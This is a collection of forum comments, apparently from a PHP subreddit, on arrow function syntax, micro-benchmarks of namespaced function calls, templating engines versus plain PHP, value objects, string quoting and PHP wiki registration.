The quality of the RFCs these days is incredible, congrats ! I find that the single expression syntax is hard to parse for the eyes when used in function call arguments, arrays, etc: array_reduce(fn($acc, $cur) =&gt; $acc+$cur, $array, 0) In this example, I would tend to wrap the full function in parentheses to make the code more readable: array_reduce((fn($acc, $cur) =&gt; $acc+$cur), $array, 0) But then, are the parentheses around the argument list necessary ? Is it possible to only require the parentheses around the whole function ? array_reduce((fn $acc, $cur =&gt; $acc+$cur), $array, 0) array_reduce(fn($acc, $cur =&gt; $acc+$cur), $array, 0) array_reduce(\($acc, $cur =&gt; $acc+$cur), $array, 0) With type hints: array_reduce(\(int $acc, int $cur :int =&gt; $acc+$cur), $array, 0) It appears that this grammar is conflict free: T_BACKSLASH_PAREN parameter_list return_type T_DOUBLE_ARROW expr ')' (It's missing returns_ref, though)
You should try [Zephir](https://zephir-lang.com/en), Its a C library designed to compile PHP-like code into a C PHP extension.
Hello, this is a straightforward translation from Alexa Model Java SDK and should help with mapping to and from Alexa Request / Response Envelopes. 
Here is a quick event sourced example where the state of an Order entity is rebuilt from its events: [https://gist.github.com/pwm/58e96d080e1482141bb0b550165efd14](https://gist.github.com/pwm/58e96d080e1482141bb0b550165efd14)
CI Bonfire ( [http://cibonfire.com/](http://cibonfire.com/) ) has all that you ask for. You won't need 40 hours, in 2-4 hours you'll have the MVP. The only minus is that it's based on CodeIgniter 3 (which is quite old). But it's the go to for an MVP.
We've been over this. &gt; wouldn't be that long Why introduce a new construct that only eliminates 60% of the boilerplate? If conciseness is not an issue we should stick to the existing closures. But as for me, I do want the conciseness and thus prefer the `fn` keyword.
Been programming in my free time for about 4 years now and started my first job working in the field over half a year ago. I'm far from mastering the language, but i'm good enough to make it my job and i learn new things every day. 
I would be curious to know which is BS for you? Laravel make millions of developper save intergalactic amount of time bootstraping : authentication, queue job, command scripts, html templating, ... They clearly know what "developper experience" means. For me, a modern framework is a framework that reduce the "technical" setup the most, leading you to reach faster the "business" setup, where all your business logic operates. If you work on a software development company, I might agree with you Laravel is not the best option (or is it?), but if you sell shoes, you do not want to spend times with downloading bundles and configuring them to fit your needs untill you see that it does not cover 100% of your needs and build your own, up to the point you are making the world again and your framework let you down at the most critical point of your company expansion. Laravel scales. That's it.
s/unambiguous/ambiguous
Personally I would prefer to combine the fn() keyword with the ~&gt; arrow syntax. It makes scanability of the code better because the arrows are **ambiguous**. It's nice that the parser can figure it out just from the fn() but people read code too. Using a different arrow syntax makes it easier for us humans who may not have noticed that fn(). Especially in code that combines both arrays and short closures. ^^This ^^was ^^posted ^^by ^^a ^^bot. ^^[Source](https://github.com/anirbanmu/substitute-bot)
Personally I would prefer to combine the fn() keyword with the ~&gt; arrow syntax. It makes scanability of the code better because the arrows are **ambiguous**. It's nice that the parser can figure it out just from the fn() but people read code too. Using a different arrow syntax makes it easier for us humans who may not have noticed that fn(). Especially in code that combines both arrays and short closures. ^^This ^^was ^^posted ^^by ^^a ^^bot. ^^[Source](https://github.com/anirbanmu/substitute-bot)
How about learning .net? Maybe getting the new guy to help teach you? The more skills you develop the better the chance you will have of advancing. The thing is, developing .net properly takes a fairly expensive infrastructure. You can do toy apps easy enough but for real apps you need professional versions of Visual Studio, probably Sql Server and a bunch of other stuff. Any company that is willing to invest in that sort of thing will probably be willing to invest in their developers as well.
I feel like this is too similarly named to SilverStripe, especially since that's also a framework and CMS...
all of it. &gt; laravel scales add this one to the list. spending a galactic amount of time on setting up templating... great troll.
Thanks for your message. By the way I have master's degree in Computational science and engineering so programming language is not an issue for me.
I am somewhat torn on the issue of arrow functions. I love writing less code. I find them incredibly hard to read when I come back to the code a few days later. &amp;#x200B; I'm all for evolution of the language though so a thumbs up with a frown from me
Magneto is one of the solution that you should consider as it offer sophisticated functionality, integrated cloud services, and dedicated customer success contacts while enabling your team to exercise their creativity to build one-of-a-kind shopping experiences. Business Intelligence, Order Management, and other tools help you to accelerate your sales and realize your commerce vision. * It is trusted by over 260,000 merchant sites that use the eCommerce platform today * It is fully customizable platform that evolves with you as your business changes and matures. 
Who said it did? /s Here i am, running CodeIgniter 1.x (circa 2010) in production on a large site(8 servers large) with php 7.2, redis, varnish, nginx, etc and tons and tons of hacks to keep it together. Thanks to composer we now have great libraries which offers us caching, logging, migrations, email handling, etc etc, otherwise i don’t think we could have keep it for so long.
There is no need to buy separate hosting for each instance infact you should go with multisite hosting which can handle all your instances on a single host. Here is an example that will give you the idea when to use multistore feature Let’s take a look over these Magento stores examples in which you want to sell apparel for men and women, so you create two separate websites named *mensapparel.com* and *womensapparel.com*. If you want, you can share the data between both the websites. Next, we have the product catalogs on both websites. If you have plans to sell shirts, trousers, and shoes in *mensapparel.com*, it will be better to create separate categories for each of these. This makes your site easier once it starts to grow. You can utilize subdomains like *shirts.mensapparel.com*, *trousers.mensapparel.com* and *shoes.mensapparel.com* for this purpose. These are the three different stores on a single website. Moreover, let’s suppose a large chunk of your target market is Hispanic. This means it will be better to have your website in Spanish along with English. Magento is amongst the few open-source ecommerce software that allows the creation of regional and multilingual websites. If you create a dropdown menu where your visitors can choose to view your websites in either Spanish or English then you can simply create 2 separate store views.
I like PHPUnit, not only as a tool for designing and testing,my code but it pushed me to learn about deeper aspects of general coding like not tightly coupling objects etc
How about default names for parameters? array_map(fn =&gt; $0-&gt;id(), $records);
accidentally \`&amp;&gt;\` is also the wanna-be-language-designer emoji 
Thank you for the input! 
Last time I was asked to teach someone about my work I was promptly fired the moment I had done. Or to be entirely accurate the moment they thought I was done because that person claimed to understand everything now (I don't think they did). &amp;#x200B; I was one of three that this was done to and it was because they found some cheaper programmers to do the work and wanted to replace us. &amp;#x200B; Not saying that's the case with the OP, but I would be very wary and if her/her instincts are telling him it's a bad idea, he may well be right. Perhaps just point them at online resources when you've identified the gaps in their knowledge. Management wont like it, but you can tell management that the new people don't know anything and what are they going to do if that's true?
Did you read the RFC? They go into a lot of detail about why some form of symbol at the start of a sort closure is necessary to not overly complicate the parser or introduce ambiguity. I think `fn() =&gt;` is 's lot better than the `\() =&gt;` that Haskell uses or `func()` in other languages. 
That was proposed in the previous RFC. I don't like it personally, I think `fn() =&gt; {}` is way better.
Yep. =&gt; and -&gt;. Should have been : and . I wasn't really onboard with the `~&gt;` proposal. But I think `fn() =&gt; {}` is a good compromise. It's only two extra characters, and is more explicit about what's happening.
Love this great tips
I'm confused by the usage of antislash. I've never seen anyone call a backslash that before.
[removed]
Oh thanks for your comment! It's because in french I say "antislash" but the correct word is backslash, I'll edit the post :\]
Was your benchmark with or without opcache for count vs \\count? I would wonder if opcache should be storing this optimization for you.
No worries, I was suspecting something like that. Nice write up aside from that
Wouldn't it be sad (for some years) if we had arrow functions in 7.4 but multi-statement support in 8.x only? I get the idea to reduce the surface of bikeshedding and maybe that is important enough but I just think multi-statement is a trivial addition, given that everything else is in place.
Pretty basic stuff. You could definitely go into a lot more detail about using FDO tools and Profilers.
I never understood the need for any php templating language other than php. Inline php is great, why abstract it
Normally these articles are pretty shit. This one was okay. Kudos.
What do you mean lost ? &amp;#x200B; I just want someone who want to help. Because I have to go to school, so I dont have lot of time. SO these is why Im asking for help.
Yes I read it, and it says there are other options that dont require a prefix. &gt; It's also similar to how many other languages implement it not C style languages like PHP.
That backslash thing seems crazy, so I tried it myself. PHP 7.3 on my desktop (not a proper benchmarking environment): ------------------------------ Not namespaced regular code: $start = microtime (true); for ($c = 0; $c &lt; 1000000; $c++) { $x = strlen ('Test'); } $end = microtime (true); echo $end - $start; **Without backslash:** &gt; 0.75204396247864 &gt; &gt; 0.76617312431335 &gt; &gt; 0.75053906440735 &gt; &gt; 0.75134706497192 &gt; &gt; 0.75926494598389 **With backslash:** &gt; 0.74511003494263 &gt; &gt; 0.76848602294922 &gt; &gt; 0.75594305992126 &gt; &gt; 0.75486397743225 &gt; &gt; 0.74626493453979 No real difference. ------------------------------ Now namespaced: namespace a\b; $start = microtime (true); for ($c = 0; $c &lt; 1000000; $c++) { $x = strlen ('Test'); } $end = microtime (true); echo $end - $start; **Without backslash:** &gt; 3.1719059944153 &gt; &gt; 3.2956070899963 &gt; &gt; 3.2646081447601 &gt; &gt; 3.1635279655457 &gt; &gt; 3.1712620258331 **With backslash:** &gt; 0.77006983757019 &gt; &gt; 0.65740180015564 &gt; &gt; 0.78280401229858 &gt; &gt; 0.75281000137329 &gt; &gt; 0.76478695869446 ------------------------------ Yo, PHP. Sup bro?
Please don't put the backslash in the front unless you want that speed improvement AND need to support PHP 5.x. You are otherwise, much better of adding `use function` and `use const`, i.e. use import statements to import the appropriate symbols.
Obviously it's shorter. My complaint is that this "shorter" is far less readable. As someone else pointed out, this MIGHT change once you get used to the syntax, just like all those C#ers and Lamda-function'ers did in the past. I just don't see it yet and to me this super short syntax is nothing but confusing and does not contribute to a more readable code. And as quickly understanding foreign code is a core-quality in developers I simply consider this a bad change.
Where did you get your numbers for count? **Half a second for 1000 counts?** Seriously? Did you run your tests on PC XT? 
The RFC explains why the options without a prefix are problematic and would cause too many issues to be worth it. Using `=&gt;` without a prefix isn't technically feasible. Using something other than `=&gt;` without a prefix would require significant changes to the parser that would increase the complexity of further language development and greatly complicate language optimisations. Given how past choices are the reason this is a problem now, making choices here that complicate future language development would be a really bad idea. &gt;not C style languages like PHP. C++ prefixes with `[]`, which isn't possible in PHP. Objective-C prefixes with `^`, which is one of the alternate prefixes suggested in the RFC. C# and JavaScript use `=&gt;` and Java uses `-&gt;`, the former isn't technically feasible and the latter would cause big issues with the parser, (C# also has the `Func&lt;&gt;` delegate which is similar). As you can see, there is little consistency between C-style languages and many of the options wouldn't work without large backwards compatibility breaks or fundamental changesd to the parser.
Opcache absolutely should be enabled in your dev environment. You need to enable `opcache.validate_timestamps` and set `opcache.revalidate_freq` to `0`. Just because it's dev doesn't mean you can't have any caching.
This is called a micro-optimization. Frankly, a bullshit.
I like it! I'm going to start calling it an antislash.
I get what you're saying but disagree on two points: readability and restriction. I don't find PHP templating as readabile as twig or blade; this is entirely subjective, but in PHP templates I often find myself having a hard time deciphering between tags and data output. Take this for example: ``` &lt;h1&gt;&lt;?php echo $header; ?&gt;&lt;/h1&gt; ``` Compared to this: ``` &lt;h1&gt;{{ header }}&lt;/h1&gt; ``` For me at least, when I see these examples I can tell you at a glance where HTML ends and twig data gets output, but I have a harder time doing the same with the PHP because the opening and closing syntax is so similar to HTML itself. On the note of restrictions, using a template language allows us to ensure that no non-template PHP code can get run in our template files. This might not seem that important when you're the only maintainer, but when you have a team and especially when you have juniors or can become a real problem to have logic accidently get defined in your templates.
&gt;This is called a micro-optimization. Frankly, a bullshit. This is a pretty huge difference though, 2.5 seconds for 1000 iterations. However, this seems like something an individual developer shouldn't have to do, and in most languages is something a compiler would optimize. Hence, why I asked about opcache and whether it makes a difference once this code is cached. It seems like PHP should be handling this optimization for us.
That's a different question. Asked in this sub regularily. In short, there are two main reasons, - auto-escaping - inheritance 
Back when Guns 'N Roses split up, Axl Rose was Anti-Slash.
This one is, actually, not 0 is okay 1 is trivial 2 is trivial and off the track. you should use a template for other reasons than speed. 3 is a micro-optimization backed but weird numbers
IIRC, "adding the backslash" is the default coding style in the source codes of the Symfony framework. PHP-CS-Fixer could do it for you automatically if you want. It's a little bit ugly though.
&gt; 2.5 seconds for 1000 iterations. What? where you all taking these weird numbers? What about 0.001 for 100000 iterations? 
function \_($s) = { echo htmlspecialchars($s); } &amp;#x200B; include "subtemplate.phtml";
&gt; 1000 iterations It's actually only 25ms for 1000 iterations. The 2.5s was for 1,000,000 iterations. So it looks like it was a .0025ms cost for each call
Yes, you are
... go on?
Looking at the rules for the code sniffer I can't find the one that covers this, could you tell me what it's called?
Come on guys, let's not start it again. It is not 3x, but that's not the point. Even for 3x, function calls take up inly a fraction of your code's runtime.The difference in unnoticeable and undetectable. 3 cents are 3x more than 1 cent. Would you consider this big 3x difference when choosing which car to buy? 
Practice makes the best teacher. Just try a project other than a homepage and you will see it for yourself.
That's a fair point, but I've certainly written code that would be buying 1000000 3 cent chocolate bars and that would make an impact. I think this micro optimization has its place is what I'm saying, but maybe it doesn't need to be everywhere in every codebase
Seriously. Using xdebug’s profiler and webgrind it’s pretty quick and easy to find low-hanging fruit and make big gains. 
You should quit not because they want to kick you out (I don't think so) but because they decided to change the technology at whim. Why the new system is under .net?. It's stupid move and it shows your business lacks of a leadership. &amp;#x200B; I love .net over php but sheesh, I can't justify to change the pipepine of a business because reasons. If a business is aligned with PHP then they could stay with it, changing to .net will bring a lot of hidden costs. &amp;#x200B; &amp;#x200B;
You're right. I skimmed this code, assuming the iterations were the same as the article, so it is a small difference.
Just a misnomer on my part. It's 2.5 seconds for 1,000,000 iterations. My fault. But I did a test myself and it is handled by PHP so like I said, not something the developer needs to worry about.
I am wondering, what made you write this article? Obviously, it has nothing to do with optimizing your PHP app for speed, it's just a few random points some of which are obvious and some are just bullshit. Were you just asked by your manager for writing an article to be published on reddit to draw attention to your corporate project? What could be other reasons to write a post like this? 
I made it on [https://3v4l.org/](https://3v4l.org/)
I've been lead backend dev on a multi million dollar SAAS project since its inception 10 years ago, I'm not green. Your smugness doesn't count as useful information.
It's from [https://3v4l.org/](https://3v4l.org/)
You need to have different URLs for different views and / or pages. Taht does not necessarily mean you will have to prepare one PHP file per page. You will have to think about what to show depending on what parameters you get from the GET call of any request and / or the URL. What to show and do if someone requests a nonexistent page or dataset. You might read up on "routing", RESTful services but be assured, there is a lot to learn. Sure, you can start with the simplemost thing that does the job but then you will inevitably make one severe error after another when you expose your code to the Internet. Perpare to be hacked in no time.
and https://3v4l.org/ is showing me completely different numbers, not nearly close to yours. Why didn't you post a link to the results? Why don't you post it now?
it is not 2.5s for 1 mil iterations *either*. The real friggin numbers are miles away from this
[https://3v4l.org/Wtnbo/perf#output](https://3v4l.org/Wtnbo/perf#output)
Go on, post a link to your tests so everyone could see
I ran this benchmark with and without opcache and PHP does seem to optimize for this as the results from an opcached test on subsequent runs seems to be very close to the same runtime. Even without opcache, I couldn't come near the same results displayed here. 1,000 iterations was a difference of about 1ms, not 100ms.
I did it 2 minutes ago on your other comment.
Not sure what it is called in code sniffer. But in [PHP-CS-Fixer](https://github.com/FriendsOfPHP/PHP-CS-Fixer), it's `native_function_invocation`.
&gt;Just a misnomer on my part. It's 2.5 seconds for 1,000,000 iterations. My fault. But I did a test myself and it is handled by PHP so like I said, not something the developer needs to worry about. I was quoting the original commenter, in my tests I couldn't reproduce this much of a difference either.
I actually don't care. I don't even add the backslash manually. It's done automatically by the coding style fixing tool. It's just a ugly-shaped "free" bonus to me.
\&gt; Do you consider yourself skilled enough to teach them? If so, I'd teach them. It is how "training the new guys" usually works: &amp;#x200B; Let's say we have a project with a deadline of 6 months and one of the member quits. So the business hires a new guy, they pick a cheap guy (with low or not experience at all) and we need to train them. Do you think the deadline will be extended?. Commonly no. 
So we have an exemplary case of misinterpreting the test results. Why I am not surprised.
I agree with you slightly, sometimes I wonder about the necessity of a full blown templating engine with PHP since PHP in it's self has a templating syntax, but I've moved on to just using PHP as a backend now so I don't worry about it much. I will say that the one thing you are missing is how easy it would be to have this: `&lt;?= $userInput ?&gt;` versus this: `&lt;?= _($userInput) ?&gt;`. Especially when you have multiple developers, it would be easy to have a XSS vuln slip past.
Post edited, cheers :) &amp;#x200B;
Because you're bitter?
One gets bitter then people write bullshit that helps noone only to promote their corporate project. 
That is a reasonable point on being easy to miss the XSS vuln. &amp;#x200B; I too also just use php for the backend and only ever deal with php templates for the login/password recovery portions of a web app. It's nice to hear that point of view reflected in others. &amp;#x200B;
Also, and about optimization. I don't know about Twig but Blade is "compiled". this code &lt;h1&gt;{{ $header }}&lt;/h1&gt; Is converted into &lt;h1&gt;&lt;?php htmlentities($header); ?&gt;&lt;/h1&gt; And this code is executed, so Blade doesn't parse the file each time but only once, so Blade is almost as fast as native PHP. 
Do either you, Bob, or Levi have Patreon accounts (or something similar) set up? I think the whole PHP community owes you all for the welcome features you're developing.
Composer's autoload is still bad for big projects, even if it is optimized. &amp;#x200B; [https://medium.com/cook-php/comparing-phps-autoload-cae183817a6a](https://medium.com/cook-php/comparing-phps-autoload-cae183817a6a) &amp;#x200B; We heavily use the functionality of autoload but it is quite a mess of class (classes). It even could use APCU and it is over-kill (over-kill fr a simple autoload feature). &amp;#x200B;
Do you have any benchmark? 
Agreed. That's naturall way of learning. Imagine you'd hire someone smarter than you, cheaper than you and who would teach you. Hiring new people is investment that might repay in the future. Like when you were hired.
I'm sorry to hear about your experience. That's very unfair behavior from the company's site. In a PHP community around me, people who teach others are very valued. Because they evaluate the whole team the longer they're in it. I wish you find such company, who can appreciate your skills and ability to pass them to others.
Every seasoned PHP developers love the performance.
Every seasoned PHP dev knows that prepature optimization is the root of all evil. And when it gets to the real optimization, it starts with profiling, not some arbitrary irrelevant pointers. 
Don't waste your time. I have worked with phalcon for over 2 years and what you save in infra costs with phalcon, you make up twice over in developer costs by using a different framework. Stick to something that will bring you better/more employment opportunities, Symfony or Laravel and if you are looking for performance learn GO or Elixir. Go will also make you more employable as it is ever more popular. Elixir will give you exposure to functional programming. Which is an interesting paradigm shift for any OO programmer.
What is the best way to prevent wrong states in an object? This is the source of my question. Basically my curiosity started with the intention of not letting a class exist with wrong values. Prevent programmers from making mistakes in class implementations and extensions. I did not want a class to even bother to have to deal with a wrong value. I just wanted it not to be started if a wrong value of a given status or type was passed. I work a lot with types in string, due to a demand for legacy code. For this I find it interesting to work with "value objects". That aparently is the primary design idea. I tried to go for something with stringly-typed (another new term I just found out). So below I have the first example. The scenario is: a class need a type and instead invoke a string 'type\_x' invoke a class and this class solving the value if it is valid. This class is the one we will see below. /** * StringlyTypeSecondOption */ class StringlyTypeFirstOption { private $type; public static function type_1() { return new self('type_1'); } public static function type_2() { return new self('type_2'); } private function __construct(string $type) { $this-&gt;type = $type; } public function __toString() { return $this-&gt;type; } } echo StringlyTypeFirstOption::type_2(); //here its ok echo StringlyTypeFirstOption::type_3(); //here we have an error cause type_3 doesnt exists This is a very good example because we havent no if or throw exception or any logic of verification. Is oop on its own. And I think its good. And now we have the second example. Will provide a solution for the same problem I proposed. class StringlyTypeSecondOption { private $type; const TYPE1 = 'type_1'; const TYPE2 = 'type_2'; private const ALLOWED_TYPES = [StringlyTypeSecondOption::TYPE1, StringlyTypeSecondOption::TYPE2]; public static function factory($type) { if (!in_array($type, StringlyTypeSecondOption::ALLOWED_TYPES, true)) { throw new Exception("Invalid type: {$type}"); } return new self($type); } private function __construct(string $type) { $this-&gt;type = $type; } public function __toString() { return $this-&gt;type; } } echo StringlyTypeSecondOption::factory('type_2'); //here its ok echo StringlyTypeSecondOption::factory('type_3'); //here we have an exception cause type_3 doesnt exists Is a very good example too but I already have some logic and is not so pure like the first one. But solve the problem like a charm too. Both imlementations have strengths and weaknesses (I think). But if there is a consolidated design that fixes allowed values for a state of a class, what its name how to implement and what is the best oop beatiful and designed strategy to prevent an invalid value in an object? I think this is more a discussion over an exact solution. If this was not the right place I ask the moderators to direct me to a better channel. Thanks advance!
Corporate? I've been working on this project alone for a few years and got absolutely 0 money for promotion, so yes, I try and write some articles giving a few tips because not everyone has the immense knowledge you have and some might find it useful. And to answer to your other comment, I wrote this because it's the kind of things that I like to read and it's an exercise to try and write an article and publish it. I also makes you learn stuff. But for sure it's easier to just sit back and say it's bullshit. I'm not claiming it's the best article ever, I wrote it in maybe 30 min, but it's there and I hope it'll be useful to some beginners. I can accept that some users find it bad, then just downvote and move on, don't write 10 comments spilling hate just because you think I got paid for doing this. I'm not a professional software developer. I share love, not hate.
+1. As someone who writes haskell as well as php \ would be my ideal choice as lambda.
\($a, $b) =&gt; ($a + $b) would be amazing
Every mainstream language other than php and c++ has implicit closures. I love nearly all things explicit but never understood why would anyone like explicit closures. They make writing them incredibly noisy and tedious for imho little to no gain.
Okay you wrote it genuinely, I can take that. So here are some pointers: - Do not publish an article that took you 30 minutes to write. Have some responsibility. Consider yourself a researcher, not a show-off. Verify your results. Do a sanity check on them. Read some articles in the area. Do several tests to confirm your results, in different environments. Consult other people if you have doubts. Consider twice if you are not a professional. Then consider again. - Have a clear goal. What is the takeaway from your article? It is quite unclear for this one. Given I am using inline PHP, its speed is exactly the same as with compiled PHP templates. And given I am using a template engine, it is already compiles. What's the point then? - Consider a meaningful title. An honest one. The current title is dead misleading. Your random list has nothing to do with optimization. It is rather harmful and misleading. Don't flatter yourself by the fact that some find your article useful - is is not that hard to impress a noob. And then they will take it literally thinking their site is optimized as they are using the opcache and a template. Oh and diligently added a backslash to every function call. And then boom - an SQL query without a proper index makes the whole site crash. &gt; I share love, To be honest, you are sharing bullshit.
To avoid that issue, I use (sort of) enums: [https://github.com/myclabs/php-enum](https://github.com/myclabs/php-enum) With that, you can safely typehint objects that can be cast to string.
Having cleaner syntax and less boilerplate is a huge point in itself. Things like this can make or brake languages.
https://en.m.wikipedia.org/wiki/Loop-invariant_code_motion You're measuring against basic compiler optimizations. You're measuring the sound of silence. 
You can also use magic to catch the non existent function however you should always be careful when using magic.
 &gt;``` &lt;h1&gt;&lt;?php echo $header; ?&gt;&lt;/h1&gt; ``` That's not how it's used anyways... ``` &lt;?= $header ?&gt; ```
But you shouldn’t refresh until you get a number that agrees with what you’re trying to promote let alone use such a small loop size. Looking at the OPcodes would be more concrete.
I'm not the smug guy but using include instead of require is rather contradicting to your claims 
ok thanks for the pointers :)
Typical detractors. I am trolling by continuing this conversation. Laravel is a tremendeous work toward improving PHP development. They pushed coding standards beyond what is possible. At the equal level of DX as RoR and Masonite (python). Symfony is good, but not at Laravel level.
The notion nowadays that developers need to publish articles because it looks good on a resume / to potential employers has lead to a swath of low effort content with questionable quality/accuracy (note that I am NOT levying this criticism to this particular post).
I've never once in my career came across a situation where using require rather than include would have saved me from an issue in my code. I learned day 2 learning php that require was superior to include, I learned much later it doesn't much matter. Do you often not have files in the location they are supposed to be in your unit tested, production codebase?
*OwO, what's this? * It's your **7th Cakeday** jyggen! ^(hug)
That's fair, but I still find that less readable because my real issue is how similar the opening and closing tags are to HTML.
Don't get me wrong, I'm entirely on your side concerning templates. I just expect someone who has 10 yrs experience to follow conventions / best practices, especially in example code because when actually being used to use for example require continuously, you'd have to actively switch to include for this case. And there really isn't any reason not to use require. 
Funny, I dislike {{ var }} because it's inconvenient to type, &lt;?= gets highlighted by the IDE but I guess so does {{}} 
You may write: `&lt;?= _("Look ma I'm escaped &lt;&gt;&lt;&gt;"); ?&gt;` But your juniors will inevitably write: `&lt;?= "Look ma, I'm pwned" ?&gt;` And while you can swear up and down that you'll never make a mistake with code you write, and your eagle eyes would never miss such a thing your team members write during code review, it's virtually guaranteed that you will end up with unescaped user input in one or more of your templates eventually using this approach. It just happens. The shorthand syntax of `_(...)` is nice enough from a brevity standpoint, but auto-escaping isn't about brevity - it's about safety. The brevity is just a perk. Compiled templating languages are safe-by-default, and you must explicitly make output _unsafe_. That reversal of behavior compared to vanilla PHP is just objectively better all around. As far as inheritance goes, you should play around with a real templating language to understand why template inheritance is so much more powerful than just `include "subtemplate.phtml";` as it's much too broad a topic to cover in a comment.
I don't disagree on that point.
with use function &amp;#x200B; use function count; &amp;#x200B; * without backslash float(0.0235650539398193359375) * with backslash : float(0.01859210968017578125) &amp;#x200B; without use function * without backslash float(0.0407989025115966796875) * with backslash float(0.0151379108428955078125) &amp;#x200B; &amp;#x200B; &amp;#x200B; &amp;#x200B; &amp;#x200B;
The main purpose of this is for variable injection into a string. When using double quotes, you could simply write: `"My age is $age".` Whereas with single quotes, you would be required to write `'My age is ' . $age;` It's also worth pointing out, that in your example of: `$result1 = $age` $result remains an integer, whereas in: `$result1 = "$age";` $age isn't just evaluated, but effectly cast to a string, the equivalent here of typing: `$result1 = (string)$age` Which you may or may not want, depending on what you're doing with it. &amp;#x200B; In terms of who uses what as a standard, you're going to find a mix, but my current job insists on the use of single quotes only, due to the extra overhead of parsing everything in double quotes for the purpsoes of evaluating any possible variables that might be in there. 
I think your understanding of the difference is correct, except for using quotes to initialize a variable as null. Doing `$nothing = '';` will get you an empty string, not a `null` value. Double quotes are useful if you want variables or escape characters evaluated in your strings, otherwise you can use single quotes. Double quotes have a use as a matter of functionality, but from the standpoint of which to wrap your strings in, then it becomes a matter of preference. Personally, I use single quotes whenever I can since it is less manipulation of the shift key when I'm cruising along on the keyboard. Even if I want variable values mixed in with my strings I'll usually just employ `sprintf` instead.
&gt; use function count; &gt; &gt; with backslash : float(0.01859210968017578125) The import is absolutely useless in this case.
CodeIgniter 4.0 is nearing release, and seems to be a step forward. Might be worth checking out.
&gt; Started as a simple one page PHP script to display a report from a MS Access database, and has expanded to a system that processes several billion dollars per year. Sounds like a helluva success story to me.
Perhaps you should consider to stop the latter one. According to https://jonczyk.me/2016/10/23/phpyths-buster-great-string-performance-test/ there is no real performance difference between single and double quotes. But concatination and the use of printf/sprintf can have heavy impact on your applications performance. Me personally I litteraly don't use sprintf anymore, but only when i need locale aware formatting of numbers. 
Have you [seen my tutorial here](https://ilovephp.jondh.me.uk)? It is pretty substantial, so don't try to do it in one sitting - maybe a chapter a day would be better. There is a lot to take in. 
``/home.php`` shows all posts. ``post.php?id=69`` shows the post with ID=69. That's the simplest way. Then you can implement some FURLs, so instead of ``website.tld/home.php`` and ``website.tld/post.php?id=69`` you have ``website.tld`` and ``website.tld/69/this-is-a-nice-post``
I learned nothing new from that post, but that's no reason to be a sick to OP.
You fail to see the difference between you prefering it and it being factual superior.
Hey, mythix\_dnb, just a quick heads-up: **prefering** is actually spelled **preferring**. You can remember it by **two rs**. Have a nice day! ^^^^The ^^^^parent ^^^^commenter ^^^^can ^^^^reply ^^^^with ^^^^'delete' ^^^^to ^^^^delete ^^^^this ^^^^comment.
So you need to have comments on on your site, get logged into wordpress, and visit a malicious site that is targeting your site. Not quite a zero day full root exploit.
This article is a myth itself. And your takeaway from it ("concatenation and the use of printf/sprintf can have heavy impact on your applications performance") is a proof. No friggin' string manipulation can have any impact on your application's performance. If you ever get concerned with performance, look elsewhere. 
Very good. This basically got me a job.
Looks like a promising package, bookmarked for future reference. How long did it take you to develop this?
Yeah, I'd rather sacrifice a 10th of a second in my One Million Iteration String Concatenation Business Value App™'s response time for the readability and conciseness that sprintf gives you. The real optimisation is not having to pick through a jumbled mess of quotes and dots to change the format of something. Even Symfony maintainers were like naaaaah when switching to fully qualified function calls ([https://github.com/symfony/symfony/issues/21020](https://github.com/symfony/symfony/issues/21020)) because these kinds of micro-optimisations aren't worth the effort. Maybe when my One Million Iteration String Concatenation SaaS product hits enough concurrent users.
Thanks for the sentiments. I've taught many people programming skills over the years. I enjoy it and find it rewarding. Just as I enjoy learning. In any position I usually find I've taught someone around me something, at least. But when the management start instructing you to teach others how to do your job... that can be a warning sign. I just want the OP to feel comfortable trusting their instincts and also pushing back on management if necessary. I suspect they aren't actually removing any of his existing work to allow time to teach people who have very little skills up to the necessary level. And that's a problem in itself.
god yes, I love Haskell's syntax for this
My bet is on sarcasm, but if not then yay! :) It's selfish on my end as I work with both languages :)
I'm not sarcastic, I love Haskell (and really need to use it more again, haven't touched it in a while… :&lt;) Unfortunately PHP already uses `\` for namespaces, so…
Why did you write a templating library when you can just use string interpolation?
Already patched in 5.1.1
ReactPHP would like to have a word with you. 
Somehow I don't get your question
Oh. I forgot to say which page. Its on the register page of the PHP wiki: [https://wiki.php.net/?do=register](https://wiki.php.net/?do=register)
I wanted the ability to pass real js objects as parameters to an html tag (component) without converting them to a string. The template library interprets the html tags and adds a attribute identifying the tag so after the template renders, the non string arguments can be applied directly to the tag to help populate the underlying component or set up html events, and the whole thing needs to work well with uglify. So something like: `&lt;!-- template id="mybutton"&gt;` `&lt;button &lt;% if (this.onclick): %&gt;$onclick=this.onclick&lt;% endif; %&gt; /&gt;` Turns into something resembling: `mybutton(data, target) { r =[]; tokens=[]; tokens['t1'] = []; r.push("&lt;button "); if (this.onclick) { tokens['t1]['onclick'] = data.onclick; } r.push(" data-tokens='t1' /&gt;"); templatelib.render(r, tokens, target); }` The idea is based off of stuff like ejs and John Resig's microtemplating concept. This is a bit of a simplification but it meets the needs of the application I am working on.
Thanks. I had an initial version which was fairly different in its approach. States\events were enums, which made it easy to have a fully declarative graph description, ie. `(new Arrow(event))-&gt;from(state)-&gt;to(state)`. The big downside was that you could only use this to label some object with a "status". In other words you could not thread data through the machine. I also had this idea to introduce transition function that are predicates so you could say sg. like `(new Arrow(event))-&gt;from(state)-&gt;given(predicate)-&gt;to(state)`. This was somewhat useful but later I found it pretty limiting. This part took ~2 days to write. Then later I had the need for states/events to become proper types so that they can contain data that can thread through the machine and can be used to build up object states in their entirety as opposed to just label them like before. This meant that I had to separate states/events from their names so that their names can be used to describe the graph. Eg. `(new Arrow(event::name))-&gt;from(state::name)-&gt;via(transition)`. Also transition functions became "proper" instead of being predicates giving them full flexibility to return any state (that's defined). The small cons with this is that it's not possible anymore to declare the "to states" of the arrows as they depend on the transition functions. This took another 2 days. So tl;dr 4 days in total.
I know this is a re-post, but I am clarifying my question as it was unclear the first time. I am trying to register for the PHP wiki at this link: [https://wiki.php.net/?do=register](https://wiki.php.net/?do=register). And I do not know what to put in for the field "To which email address do you have to send an email to now?"
This thing is probably the worst "spam protection" you ever saw in your life, so bad is it, that it's not obvious that it is actually spam protection ... You're supposed to know what email to enter because this is the second part of the process for registering on wiki: &gt; Get wiki RFC karma (this is only required if you don't have a VCS account for php.net. PHP developers can log on with their credentials and already have the necessary karma to create RFCs): Register for a wiki account at https://wiki.php.net/start?do=register. Email **internals@lists.php.net** requesting RFC karma for your wiki account. In the email, remind people about the RFC you plan to create. Note that RFC karma does not automatically give you karma to vote. See https://wiki.php.net/rfc/voting#rfc_proposer
Oh. My. Yeah, that's bad. Thanks though!
